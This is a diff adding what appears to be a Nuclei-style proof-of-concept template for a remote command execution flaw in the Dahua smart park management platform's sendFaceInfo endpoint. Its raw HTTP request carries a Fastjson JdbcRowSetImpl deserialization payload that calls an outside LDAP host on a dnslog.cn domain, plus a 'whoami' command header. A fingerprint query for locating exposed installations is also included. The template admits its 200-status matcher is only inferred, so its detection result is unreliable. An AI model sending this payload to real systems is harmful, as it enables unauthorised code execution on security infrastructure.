@@ -1,0 +1,38 @@
+id: poc-b9337beeb67bb68aaeaf
+info:
+  name: 大华智慧园区综合管理平台sendFaceInfo远程命令执行
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/b9337beeb67bb68aaeaf39da40cd474e
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: b9337beeb67bb68aaeaf39da40cd474e
+    fofa: + hunter:`app.name="Dahua 大华 智慧园区管理平台"`
+http:
+- raw:
+  - 'POST /CardSolution/card/face/sendFaceInfo HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+
+    Content-Length: 216
+
+    Accept-Encoding: gzip
+
+    Connection: close
+
+    Content-Type: application/json
+
+    Testcmd: whoami
+
+
+    {"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://qq6t3h.dnslog.cn","autoCommit":true}}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
